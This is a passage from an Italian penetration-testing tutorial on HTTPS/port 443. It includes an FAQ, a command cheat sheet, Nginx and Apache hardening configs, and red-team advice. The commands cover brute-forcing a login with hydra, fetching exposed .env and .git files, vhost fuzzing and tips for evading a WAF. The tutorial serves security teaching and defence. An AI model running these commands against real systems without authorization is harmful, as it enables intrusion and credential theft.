Leggi i SAN del certificato: `openssl s_client -connect <target>:443 | openssl x509 -noout -ext subjectAltName`. Poi completa con Certificate Transparency: `curl "https://crt.sh/?q=%25.domain.com&output=json"`.

**La porta 443 con TLS 1.2 è vulnerabile?**
Non per forza. TLS 1.2 è sicuro con cipher forti (ECDHE + AES-GCM). I problemi nascono da cipher deboli, HSTS assente o versioni obsolete (TLS 1.0 e 1.1) abilitate in parallelo. Verifica con `testssl.sh --fast https://<target>`.

**Come scopro i virtual host nascosti?**
Fuzzing dell'header `Host` con ffuf: `ffuf -u https://<IP>/ -H "Host: FUZZ.domain.com" -w subdomains.txt -k -fs <dimensione_default>`. Parti dagli hostname trovati nel certificato.

**Cos'è lo SSL stripping e quando funziona?**
Intercetta il traffico HTTP iniziale e impedisce l'upgrade a HTTPS. Funziona solo se il sito non ha HSTS o se il client non lo ha mai visitato. Verifica con `curl -skI https://<target> | grep -i strict-transport`.

**Come testo una web application su HTTPS con Burp Suite?**
Imposta Burp come proxy (127.0.0.1:8080), installa il certificato della CA di Burp nel browser e naviga. Per le API: `curl --proxy http://127.0.0.1:8080 -k https://<target>/api/endpoint`.

**Quali file sensibili cerco sulla porta 443?**
`.env`, `.git/HEAD`, `web.config`, `config.php.bak` e `.old`, `robots.txt`, `sitemap.xml`, `/server-status`, `phpinfo.php`, `/swagger.json`, `/openapi.yaml` e `/.well-known/`.

**HTTP e HTTPS sono la stessa cosa?**
No. HTTPS è HTTP dentro un tunnel TLS: stesso protocollo applicativo, ma cifrato e con identità del server verificata.

**SSL e TLS sono la stessa cosa?**
Quasi. SSL è il protocollo vecchio e insicuro, TLS è il successore. Oggi si usa sempre TLS, anche quando si parla di "certificato SSL".

***

## Cheat sheet finale

| Azione                 | Comando                                                                                          |
| ---------------------- | ------------------------------------------------------------------------------------------------ |
| Scan HTTPS completo    | `nmap -sV -sC -p 443 --script ssl-enum-ciphers <target>`                                         |
| Lettura certificato    | `openssl s_client -connect <target>:443 \| openssl x509 -noout -text`                            |
| SAN del certificato    | `openssl s_client -connect <target>:443 \| openssl x509 -noout -ext subjectAltName`              |
| Sottodomini da crt.sh  | `curl -s "https://crt.sh/?q=%25.domain.com&output=json" \| jq -r '.[].name_value' \| sort -u`    |
| Virtual host fuzzing   | `ffuf -u https://<IP>/ -H "Host: FUZZ.domain.com" -w subdomains.txt -k -fs <size>`               |
| Directory discovery    | `ffuf -u https://<target>/FUZZ -w raft-medium-directories.txt -e .php,.bak,.old -k -fc 404`      |
| Audit TLS completo     | `testssl.sh --fast https://<target>`                                                             |
| Controllo TLS rapido   | `sslscan <target>:443`                                                                           |
| Heartbleed             | `nmap --script ssl-heartbleed -p 443 <target>`                                                   |
| Test TLS 1.0           | `openssl s_client -connect <target>:443 -tls1`                                                   |
| Header di sicurezza    | `curl -skI https://<target>`                                                                     |
| HTTP/3 attivo          | `curl -skI https://<target> \| grep -i alt-svc`                                                  |
| Scan UDP 443           | `sudo nmap -sU -p 443 <target>`                                                                  |
| Brute force login      | `hydra -l admin -P pass.txt <target> https-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"` |
| File .env              | `curl -sk https://<target>/.env`                                                                 |
| Git esposto            | `curl -sk https://<target>/.git/HEAD`                                                            |
| Vulnerability scan web | `nikto -h https://<target> -ssl`                                                                 |

***

## Perché la porta 443 è rilevante nel 2026

La 443 è la porta più esposta e più attaccata. Ormai quasi tutto il traffico web di produzione passa da HTTPS: API REST, GraphQL, WebSocket, pannelli admin, VPN web. Ogni organizzazione ha decine o centinaia di servizi sulla 443, spesso dietro gli stessi IP con virtual host diversi. Per una prima verifica della superficie su un intervallo autorizzato usa:

```bash
nmap -p 443 --open -oG - 192.168.1.0/24
```

Con HTTP/3 la superficie cresce ancora: la stessa porta ora vive anche su UDP, dove molti strumenti di difesa vedono poco.

***

## Hardening e mitigazione

**Nginx:**

```
server {
    listen 443 ssl http2;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256;
    ssl_prefer_server_ciphers on;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
    add_header X-Content-Type-Options "nosniff" always;
    server_tokens off;

    # Block sensitive files
    location ~ /\.(env|git|ht) { deny all; }
}
```

**Apache:**

```
SSLProtocol -all +TLSv1.2 +TLSv1.3
SSLCipherSuite ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
Header always set X-Content-Type-Options "nosniff"
ServerTokens Prod
ServerSignature Off

# Block sensitive files
<FilesMatch "^\.(env|git|ht)">
    Require all denied
</FilesMatch>
```

**Checklist:**

* Abilita **HSTS** con `max-age` lungo e valuta la preload list.
* Disabilita SSLv3, TLS 1.0 e 1.1. Tieni solo TLS 1.2 e 1.3 con cipher ECDHE + AES-GCM.
* Rimuovi gli header informativi (`Server`, `X-Powered-By`).
* Non esporre file sensibili (`.env`, `.git`, backup, `phpinfo.php`).
* Disattiva la compressione sulle risposte che contengono dati sensibili (BREACH).
* Monitora i certificati emessi per il tuo dominio con Certificate Transparency.
* Se usi HTTP/3, apri la **443/UDP** sul firewall e assicurati che WAF e IDS la ispezionino.
* Verifica periodicamente con `testssl.sh` e con i controlli di questo articolo.

***

## OPSEC per il Red Team

Le richieste HTTPS sulla 443 sono il traffico più normale che esista: il livello di rumore di base è basso, il problema è il volume e il pattern. Una directory brute force da 10000 richieste in 30 secondi è subito visibile in qualsiasi WAF. Per ridurre la visibilità:

* Limita il rate a 5-10 richieste al secondo.
* Usa user-agent realistici.
* Evita wordlist note che le WAF riconoscono.
* Distribuisci le richieste su più IP se l'engagement lo permette.
* Parti sempre dal certificato e da Certificate Transparency: sono fasi passive, senza rumore verso il target.

***

> **Disclaimer:** Tutti i comandi e le tecniche descritte in questo articolo sono destinati esclusivamente all'uso in ambienti autorizzati: laboratori personali, macchine virtuali CTF come HackTheBox/TryHackMe e penetration test con autorizzazione scritta del proprietario del sistema. L'accesso non autorizzato a sistemi informatici è un reato penale in Italia (art. 615-ter c.p.) e nella maggior parte delle giurisdizioni internazionali. L'intercettazione di comunicazioni altrui senza consenso è reato (art. 617-quater c.p.). L'autore e HackIta declinano ogni responsabilità per usi impropri di queste informazioni. Riferimenti tecnici: RFC 8446 (TLS 1.3), RFC 2818 (HTTP over TLS), RFC 6797 (HSTS), RFC 9000 (QUIC) e RFC 9114 (HTTP/3).

Vuoi supportare HackIta? Visita [https://hackita.it/supporto](https://hackita.it/supporto/) per donazioni. Per penetration test professionali e formazione 1:1, scopri [https://hackita.it/servizi](https://hackita.it/servizi/).
